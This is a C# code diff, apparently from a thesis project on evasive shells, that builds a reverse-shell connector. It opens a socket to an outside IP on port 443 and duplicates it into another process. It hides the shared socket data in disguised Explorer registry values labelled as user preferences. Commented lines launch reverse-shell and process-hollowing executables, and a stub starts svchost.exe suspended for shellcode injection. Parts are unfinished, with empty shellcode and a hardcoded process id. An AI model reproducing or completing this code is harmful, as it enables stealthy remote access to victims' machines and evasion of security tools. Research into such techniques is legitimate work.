@@ -5,6 +5,7 @@
   using System.Net.Sockets;
   using System.Runtime.InteropServices;
   using System.Text;
+  using Microsoft.Win32;
   using SocketHelpers;
 
   public class Program
@@ -41,7 +42,7 @@
     [DllImport("Ws2_32.dll", SetLastError = true)]
     public static extern int connect(IntPtr socket, IntPtr name, int namelen);
 
-    [DllImport("kernel32.dll")]
+    [DllImport("kernel32.dll", SetLastError = true)]
     public static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);
 
     [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
@@ -156,15 +157,14 @@
 
     public static async Task Main(string[] args)
     {
-      if (File.Exists("C:\\Temp\\socketinfo.bin"))
-        File.Delete("C:\\Temp\\socketinfo.bin");
-
+      Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "SessionData", string.Empty, RegistryValueKind.String);
+      Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "UserConfig", string.Empty, RegistryValueKind.String);
 
       Helpers.InitializeWSA();
       var sockAddrIn = new sockaddr_in();
       sockAddrIn.sin_family = 2;
       sockAddrIn.sin_port = htons(443);
-      sockAddrIn.sin_addr.S_addr = inet_addr("172.104.237.62");
+      sockAddrIn.sin_addr.S_addr = inet_addr("192.168.0.187");
 
       var sockAddrInPtr = Marshal.AllocHGlobal(Marshal.SizeOf(sockAddrIn));
       Marshal.StructureToPtr(sockAddrIn, sockAddrInPtr, false);
@@ -178,26 +178,68 @@
 
       if (ret != 0)
         await Console.Out.WriteLineAsync("WSAIoctl failed");
-      
-      WSAConnect(socket, ref sockAddrIn, Marshal.SizeOf(sockAddrIn), IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
-      //connect(socket, sockAddrInPtr, Marshal.SizeOf(sockAddrIn));
 
       STARTUPINFO startupInfo = new STARTUPINFO();
       Marshal.AllocHGlobal(Marshal.SizeOf(startupInfo));
       startupInfo.cb = Marshal.SizeOf(startupInfo);
       startupInfo.dwFlags = CreationFlags.STARTF_USESTDHANDLES;
 
+      Console.WriteLine("creating process");
       PROCESS_INFORMATION pinfo = new PROCESS_INFORMATION();
-      CreateProcessA(null, @"EvasiveShell_SocketConnection.exe", IntPtr.Zero, IntPtr.Zero, true, CreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, null, ref startupInfo, ref pinfo);
 
-      WSADuplicateSocket(socket, pinfo.dwProcessId, ref protocolInfo);
-      Console.WriteLine("Socket dupicated");
+      //CreateProcessA(null, @"F:\FH_Technikum_Wien\Masterarbeit\SimpleCShell\SimpleCShell\reverseshell.exe", IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref startupInfo, ref pinfo);
+
+      //CreateProcessA(null, @"F:\FH_Technikum_Wien\Masterarbeit\SimpleReverseShell\CShellHollowingTesting\bin\Debug\net6.0\CShellHollowingTesting.exe", IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref startupInfo, ref pinfo);
+
+      Helpers.PrintLastError(nameof(CreateProcessA));
+
+      Console.WriteLine("Process created - duplicating socket");
+
+      string registryValue = string.Empty;
+      
+      //do
+      //{
+      //  var value = Registry.GetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "UserConfig", null);
+
+      //  if (value != null)
+      //    registryValue = value.ToString();
+      //}
+      //while (!registryValue.StartsWith("PID:"));
+
+      //var pid = Convert.ToUInt32(registryValue.Split(':')[1]);
+      //var pid = pinfo.dwProcessId;
+
+      Console.ReadKey();
+      uint pid = 5;
+      WSADuplicateSocket(socket, pid, ref protocolInfo);
+      Console.WriteLine("Socket duplicated.");
+      Console.WriteLine("Writing user preferences ;)");
       var serialized = SerializeProtocolInfo(protocolInfo);
 
-      if (!Directory.Exists("C:\\Temp"))
-        Directory.CreateDirectory("C:\\Temp");
+      //WSAConnect(socket, ref sockAddrIn, Marshal.SizeOf(sockAddrIn), IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
 
-      File.WriteAllBytes("C:\\Temp\\socketinfo.bin", serialized);
+      Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "SessionData", Convert.ToBase64String(serialized), RegistryValueKind.String);
+      Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "UserConfig", "1", RegistryValueKind.String);
+      //if (!Directory.Exists("C:\\Temp"))
+      //  Directory.CreateDirectory("C:\\Temp");
+
+      //File.WriteAllBytes("C:\\Temp\\socketinfo.bin", serialized);
+
+      //Console.WriteLine("Part 1 finish");
+    }
+
+    private static void ConnectEvasive()
+    {
+      var shellcode = @"";
+      var targetPath = @"C:\\Windows\\System32\\svchost.exe";
+      var startupInfo = new STARTUPINFO();
+      var processInfo = new PROCESS_INFORMATION();
+
+      var dll = LoadLibrary("Ws2_32.dll");
+      var connectAddress = GetProcAddress(dll, "connect");
+
+      var procInit = CreateProcessA(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref startupInfo, ref processInfo);
+      Console.WriteLine("connect success");
     }
 
     private static bool DetectHooks()
